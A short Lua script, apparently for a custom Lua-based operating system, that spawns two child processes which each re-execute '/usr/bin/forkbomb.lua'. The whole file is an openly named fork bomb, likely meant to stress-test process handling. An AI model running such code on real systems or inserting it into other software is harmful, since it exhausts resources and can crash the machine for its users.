local process = require("process")
local syscalls = require("syscalls")

local function spawnChild()
	local child, err = process.spawn("Fork", {
		[0] = io.stdout.fd,
	})
	if not child then error(err) end
	local ok, err = process.exec(child, "/usr/bin/forkbomb.lua")
	if not ok then error(err) end
end

spawnChild()
spawnChild()
coroutine.yield()
